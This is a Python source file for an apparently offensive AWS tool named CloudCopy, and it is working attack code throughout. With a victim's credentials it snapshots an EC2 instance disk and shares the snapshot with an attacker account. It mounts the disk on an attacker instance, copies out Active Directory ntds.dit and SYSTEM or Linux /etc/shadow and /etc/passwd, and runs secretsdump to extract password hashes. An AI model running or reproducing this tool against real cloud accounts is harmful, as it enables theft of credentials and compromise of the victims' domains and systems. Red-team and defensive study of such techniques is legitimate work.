import io
import os
import time
import uuid

import boto3
import paramiko
import requests
from botocore.exceptions import ClientError

'''
Util methods for actually CloudCopying
'''


class CloudCopyUtils:

    def __init__(self, loginContext):
        self.keyName = str(uuid.uuid4())
        self.loginContext = loginContext  # contains context for the CloudCopy attack
        self.victimInstance = None  # boto3.Instance object that is the victim instance we are CloudCopying
        self.victimSnapshot = None  # boto3.Snapshot that is the snapshot made from victim instance
        self.attackingInstance = None  # boto3.Instance object that is the attacking instance holding the snapshot
        self.securityGroup = None  # boto3.SecurityGroup that is the security group for accessing the attacker instance
        self.vpc = None  # bot3.VPC that is the VPC our cloned instance will live in
        self.subnet = None  # boto3.Subnet is the subnet inside the VPC where our cloned instance will live
        self.internetGateway = None  # boto3.InternetGateway is the gateway for the VPC to reach the interwebs
        self.instanceKey = None  # boto3.KeyPair that is the PEM key used for accessing the instance
        self.botoClient = None  # boto3 client for accessing AWS programmatically
        self.attackMode = 'victim'  # attack mode currently in use 'victim' for running in their AWS 'attacker' for ours

    def printGap(self):
        print('---------------------------------------------------------')

    def cleanup(self):
        self.printGap()
        print("cleaning up any mess we made")
        if self.internetGateway and not self.vpc.preset:
            self.internetGateway.load()
            attachedVpcs = self.internetGateway.attachments
            for vpc in attachedVpcs:
                self.internetGateway.detach_from_vpc(VpcId=vpc['VpcId'])
            self.internetGateway.delete()
        if self.subnet and not self.vpc.preset:
            self.subnet.delete()
        if self.vpc and not self.vpc.preset:
            self.vpc.delete()
        if self.instanceKey:
            self.instanceKey.delete()
            print("Deleted key " + self.keyName)
            os.remove("./" + self.keyName + ".pem")
            self.instanceKey = None
        if self.attackingInstance:
            print("Waiting for CloudCopy instance to terminate...")
            try:
                self.attackingInstance.terminate()
                self.attackingInstance.wait_until_terminated()
            except ClientError:
                self.attackingInstance.wait_until_terminated()
            self.attackingInstance = None
        if self.securityGroup:
            try:
                self.securityGroup.delete()
                print("Deleted security group " + self.securityGroup.group_name)
            except ClientError as e:
                if e.response['Error']['Code'] != 'InvalidGroup.NotFound':
                    print(
                        "Error deleting Security Group. May still be tied to instance. Waiting 30 secs and trying again.")
                    time.sleep(30)
                    try:
                        self.securityGroup.delete()
                        print("Deleted security group")
                    except ClientError:
                        print("Couldn't delete security group, may have to remove manually.")
            self.securityGroup = None
        if self.victimSnapshot:
            self.attackMode = 'victim'
            try:
                self.createBotoClient()
                snapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
                snapshot.delete()
                print("Deleted snapshot " + self.victimSnapshot.snapshot_id)
                self.victimSnapshot = None
            except ClientError:
                print("Switching client context back to victim failed. Could not delete initial Snapshot")
        self.printGap()

    def setAttackContext(self, attackContext):
        self.attackMode = attackContext

    # creates the boto3.Resource for accessing AWS
    def createBotoClient(self):
        try:
            if self.loginContext['type'] == 'profile':
                self.botoClient = boto3.Session(profile_name=self.loginContext['options'][self.attackMode + 'Profile'],
                                                region_name=self.loginContext['options']['region']).resource('ec2')
            else:
                self.botoClient = boto3.Session(
                    aws_access_key_id=self.loginContext['options'][self.attackMode + 'AccessKey'],
                    aws_secret_access_key=self.loginContext['options'][self.attackMode + 'SecretKey'],
                ).resource('ec2')
        except ClientError:
            return False

    # lists available instances within the victim AWS account in the specified region
    def listInstances(self):
        instances = list(self.botoClient.instances.all())
        for index, instance in enumerate(instances):
            if instance.tags is not None:
                print(str(index) + ' - ' + instance.instance_id + ":" + instance.tags[0]['Value'])
            else:
                print(
                    str(index) + ' - ' + instance.instance_id + ": No name. Can CloudCopy but DC Hashes may not exist.")

        inp = input("which instance are we CloudCopying today? (# or exit to go back) ")
        if inp != 'exit':
            try:
                self.victimInstance = instances[int(inp)]
                return True
            except ValueError:
                return False
        else:
            return False

    # creates a snapshot of a specified victim instance
    def createSnapshot(self):
        victimVolumeId = self.victimInstance.block_device_mappings[0]['Ebs']['VolumeId']
        try:
            self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                try:
                    self.victimSnapshot = self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=False)
                    self.victimSnapshot.load()
                    while self.victimSnapshot.state != 'completed':
                        print("Snapshot hasn't been created yet, waiting...")
                        self.victimSnapshot.load()
                        time.sleep(10)
                    print("Snapshot created, sharing it with attacker account")
                    return True
                except ClientError:
                    print("Snapshot could not be created, sorry")
                    self.cleanup()
                    return False
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
                self.cleanup()
                return False

    # modifies the created snapshot to share it with the attacker owned account
    def modifySnapshot(self):
        if not self.victimSnapshot.encrypted:
            self.victimSnapshot.modify_attribute(Attribute='createVolumePermission', CreateVolumePermission={
                'Add': [{'UserId': self.loginContext['options']['attackeraccountid']}]
            })
            print("Snapshot should have been shared. Switching to attacker account.")
            self.setAttackContext('attacker')
            try:
                self.createBotoClient()
            except ClientError:
                return False
            self.victimSnapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
            while True:
                try:
                    # just checking if this fails to determine if it's in attacker control
                    self.victimSnapshot.description
                    break
                except ClientError:
                    print("Snapshot hasn't arrived, waiting...")
                    time.sleep(10)
            print("We have the snapshot in our control time to mount it to an instance!")
            return True
        else:
            print("No point sharing the snapshot, it is encrypted")
            return False

    # creates a security group for the attacker controlled instance so that we can SSH to it. It's open to the world FYI
    def createSecurityGroup(self):
        ip = requests.get('https://checkip.amazonaws.com').text.strip() + "/32"
        for securityGroup in list(self.vpc.security_groups.all()):
            for permission in securityGroup.ip_permissions:
                for ipRange in permission['IpRanges']:
                    if ipRange['CidrIp'] == ip or ipRange['CidrIp'] == '0.0.0.0/0':
                        if permission['IpProtocol'] == '-1' or (['FromPort'] == permission['ToPort'] == '22'):
                            for egressPerm in securityGroup.ip_permissions_egress:
                                if egressPerm['IpProtocol'] == '-1' or (
                                        egressPerm['FromPort'] == egressPerm['ToPort'] == '-1'):
                                    self.securityGroup = securityGroup
                                    print("Found usable security group")
                                    return True
        print("Couldn't find a suitable security group for exfil so we are making one")
        security_group_name = str(uuid.uuid4())
        try:
            self.botoClient.create_security_group(
                Description='For connecting to cred stealing instance.',
                GroupName=security_group_name,
                VpcId=self.vpc.vpc_id,
                DryRun=True
            )
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                self.securityGroup = self.botoClient.create_security_group(
                    Description='For connecting to cred stealing instance.',
                    GroupName=security_group_name,
                    VpcId=self.vpc.vpc_id,
                    DryRun=False
                )
                self.securityGroup.load(),
                self.securityGroup.authorize_ingress(GroupId=self.securityGroup.group_id, IpProtocol="tcp",
                                                     CidrIp=ip, FromPort=22, ToPort=22)
                print("Finished creating security group " + security_group_name + " for instance " +
                      self.victimInstance.instance_id)
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSecurityGroup permission. This attack will not succeed. K-Bye.")
                self.cleanup()
                return False

    # creates a VPC for the instance to live in
    def createVPC(self):
        existingVpc = self.getUseableVPC()
        if existingVpc:
            self.vpc = existingVpc
            self.vpc.preset = True  # custom property to skip next sections
            self.vpc.load()
            print("using preexisting VPC, " + self.vpc.vpc_id)
            return True
        else:
            try:
                self.botoClient.create_vpc(CidrBlock='172.16.0.0/16', DryRun=True)
            except ClientError as e:
                if e.response['Error']['Code'] == 'DryRunOperation':
                    self.vpc = self.botoClient.create_vpc(CidrBlock='172.16.0.0/16', DryRun=False)
                    self.vpc.load()
                    self.internetGateway.attach_to_vpc(VpcId=self.vpc.vpc_id)
                    print("Created new VPC " + self.vpc.vpc_id + " for instance " + self.victimInstance.instance_id)
                    return True
                elif e.response['Error']['Code'] == 'VpcLimitExceeded':
                    print("Too many VPCs")
                    self.cleanup()
                    return False
                else:
                    print("We could not create the VPC for the instance. This attack will not succeed. K-Bye.")
                    self.cleanup()
                    return False
            except Exception as ex:
                print(ex)
                return False

    def getUseableVPC(self):
        # We try and find a VPC that's usable on the account
        for vpc in list(self.botoClient.vpcs.all()):
            if len(list(vpc.subnets.all())) > 0:
                if len(list(vpc.internet_gateways.all())) > 0:
                    # if the vpc has all the pieces we need use that
                    return vpc
        return None

    def createInternetGateway(self):
        if self.vpc.preset:
            print("Using internet gateway of VPC")
            return True
        else:
            try:
                self.botoClient.create_internet_gateway(DryRun=True)
            except ClientError as e:
                if e.response['Error']['Code'] == 'DryRunOperation':
                    self.internetGateway = self.botoClient.create_internet_gateway(DryRun=False)
                    print("Created new internet gateway " + self.internetGateway.internet_gateway_id)
                    return True
                else:
                    print("We could not create the internet gateway. This attack will not succeed. K-Bye.")
                    self.cleanup()
                    return False

    def createSubnet(self):
        if len(list(self.vpc.subnets.all())) != 0:
            # we already have subnets available
            self.subnet = list(self.vpc.subnets.all())[0]
            self.subnet.load()
            print("Using existing subnet: " + self.subnet.subnet_id)
            return True
        else:
            try:
                self.botoClient.create_subnet(CidrBlock='172.16.0.0/16', VpcId=self.vpc.vpc_id, DryRun=True)
            except ClientError as e:
                if e.response['Error']['Code'] == 'DryRunOperation':
                    self.subnet = self.botoClient.create_subnet(CidrBlock='172.16.0.0/16', VpcId=self.vpc.vpc_id,
                                                                DryRun=False)
                    print(
                        "Created new subnet " + self.subnet.subnet_id + " for instance " + self.victimInstance.instance_id)
                    return True
                else:
                    print(
                        "We could not create the subnet inside the VPO for the instance. This attack will not succeed. K-Bye.")
                    self.cleanup()
                    return False

    # create a key pair for use with the attacking instance if one is not set
    def createKeyPair(self):
        try:
            self.botoClient.create_key_pair(KeyName=self.keyName, DryRun=True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                self.instanceKey = self.botoClient.create_key_pair(KeyName=self.keyName, DryRun=False)
                print("Created new key " + self.keyName + " for instanced. Wrote the PEM file to disc for use later.")
                private_key_string = io.StringIO()
                private_key_string.write(self.instanceKey.key_material)
                private_key_string.seek(0)
                paramiko.RSAKey.from_private_key(private_key_string).write_private_key_file(
                    './' + self.keyName + '.pem')
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateKeyPair permission. This attack will not succeed. K-Bye.")
                self.cleanup()
                return False

    # creates a new attacker owned EC2 instance that uses the snapshot as an attached disk containing the DC hashes
    def createInstance(self):
        try:
            self._createInstance(True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                print("Dry run succeeded! Creating instance for real.")
                self._createInstance(False)
                while self.attackingInstance.state['Name'].strip() != "running":
                    print("Your instance will be arriving shortly...")
                    time.sleep(10)
                    self.attackingInstance.load()
                print("Your instance has arrived. Time to get some sweet sweet creds!")
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSecurityGroup permission. This attack will not succeed. K-Bye.")
                return False
            else:
                print(e)
                return False

    # helper to create the instance given a specific key
    def _createInstance(self, isDryRun):
        self.attackingInstance = self.botoClient.create_instances(
            DryRun=isDryRun,
            BlockDeviceMappings=[{
                "DeviceName": '/dev/sdf',
                "Ebs": {
                    "SnapshotId": self.victimSnapshot.snapshot_id
                }
            }],
            NetworkInterfaces=[
                {
                    'SubnetId': self.subnet.subnet_id,
                    'DeviceIndex': 0,
                    'AssociatePublicIpAddress': True,
                    'Groups': [self.securityGroup.group_id]
                }
            ],
            ImageId='ami-0c6b1d09930fac512',
            MaxCount=1,
            MinCount=1,
            InstanceType='t2.micro',
            KeyName=self.keyName)[0]
        print(self.attackingInstance)

    # helper to create the connection to the attacker instance
    def connectToInstance(self):
        private_key_string = io.StringIO()
        private_key_string.write(self.instanceKey.key_material)
        private_key_string.seek(0)
        key = paramiko.RSAKey.from_private_key(private_key_string)
        connection = paramiko.SSHClient()
        connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to instance")
        connected = False
        while not connected:
            try:
                connection.connect(hostname=self.attackingInstance.public_dns_name, username='ec2-user', pkey=key)
                connected = True
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("Can't connect yet, instance may still be warming up. Trying again in 10s")
                time.sleep(10)
            except TimeoutError as t:
                print("Timeout in connection, security rules are borked. Cleaning up")
                self.cleanup()
                return None, None
        sftp = connection.open_sftp()
        return connection, sftp

    # SSH's into the instance mounts the DC snapshot copies the ntds.dit and SYSTEM file gives ownership to ec2-user
    # SFTP's into the instance and downloads the ntds.dit and SYSTEM file locally
    # runs impacket's secretsdump tool to recreate the hashes. Expects secretsdump to be on your path.
    def stealDCHashFiles(self):
        outfileUid = str(uuid.uuid4())
        connection, sftp = self.connectToInstance()
        if connection and sftp:
            self.printGap()
            #   have to block on these calls to ensure they happen in order
            _, stdout, _ = connection.exec_command("sudo mkdir /windows")
            stdout.channel.recv_exit_status()
            _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
            stdout.channel.recv_exit_status()
            _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
            stdout.channel.recv_exit_status()
            _, stdout, _ = connection.exec_command(
                "sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
            stdout.channel.recv_exit_status()
            _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
            stdout.channel.recv_exit_status()
            print("finished configuring instance to grab Hash Files")
            self.printGap()
            print("Pulling the files...")
            try:
                sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM-" + outfileUid)
                print("SYSTEM registry hive file retrieval complete")
                sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit-" + outfileUid)
                print("ntds.dit registry hive file retrieval complete")
                sftp.close()
                connection.close()
                self.printGap()
                print("finally gonna run secretsdump!")
            except Exception as e:
                print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
            try:
                import platform
                import subprocess
                if platform.system() == "Windows":
                    subprocess.run(
                        ["C:\Python27\Scripts\secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds",
                         "./ntds.dit-" + outfileUid, "local",
                         "-outputfile", "secrets-" + outfileUid], shell=True)
                else:
                    subprocess.run(
                        ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid,
                         "local",
                         "-outputfile", "secrets-" + outfileUid])
            except FileNotFoundError:
                print("hmm can't seem to find secretsdump on your path. Run this manually against the files.")

    # Same as above we are just stealing /etc/shadow and /etc/passwd now
    def stealShadowPasswd(self):
        outfileUid = str(uuid.uuid4())
        connection, sftp = self.connectToInstance()
        self.printGap()
        #   have to block on these calls to ensure they happen in order
        _, stdout, _ = connection.exec_command("sudo mkdir /linux")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /linux/")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /linux/etc/shadow /home/ec2-user/shadow")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /linux/etc/passwd /home/ec2-user/passwd")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
        stdout.channel.recv_exit_status()
        print("finished configuring instance to grab Shadow and Passwd files")
        self.printGap()
        print("Pulling the files...")
        try:
            sftp.get("/home/ec2-user/shadow", "./shadow-" + outfileUid)
            print("/etc/shadow file retrieval complete")
            sftp.get("/home/ec2-user/passwd", "./passwd-" + outfileUid)
            print("/etc/passwd file retrieval complete")
            sftp.close()
            connection.close()
            self.printGap()
        except Exception as e:
            print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")